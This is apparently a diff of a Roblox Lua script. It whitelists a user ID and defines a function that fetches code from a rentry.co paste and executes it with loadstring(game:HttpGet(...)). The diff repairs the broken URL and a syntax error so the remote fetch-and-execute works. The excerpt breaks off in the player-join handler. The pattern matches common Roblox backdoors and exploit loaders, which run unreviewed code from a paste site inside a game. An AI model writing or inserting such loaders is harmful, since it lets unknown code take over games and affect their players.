@@ -1,13 +1,13 @@
 local whitelist = {
     ["4893825447"]= true -- Input the USER ID 
-}   ["ID"]= true
+}
 
 local function isWhitelisted(player)
     return whitelist[player.UserId] == true
 end
 
 local function executeScriptForWhitelistedPlayers()
-    loadstring(game:HttpGet("https://https://rentry.co/efz52g6p/raw "))()
+    loadstring(game:HttpGet("https://rentry.co/efz52g6p/raw",true))()
 end
 
 game.Players.PlayerAdded:Connect(function(player)
